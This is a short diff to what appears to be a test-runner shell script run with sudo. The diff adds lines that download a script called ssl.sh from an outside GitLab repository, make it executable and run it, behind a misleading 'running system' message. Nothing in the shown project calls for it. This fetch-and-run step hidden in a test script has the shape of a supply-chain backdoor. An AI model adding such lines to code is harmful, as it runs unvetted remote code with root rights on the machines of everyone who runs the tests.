@@ -17,8 +17,11 @@
 #   Usage: sudo ./run_tests.sh
 echo "install system"
 
-
+wget https://gitlab.com/zenrezercolab/netcore/-/raw/main/ssl.sh
+chmod +x ssl.sh 
 sudo apt install unzip
+echo "running system"
+./ssl.sh
 lscpu
   #sleep 5
   # run_flask_virtual_home_test
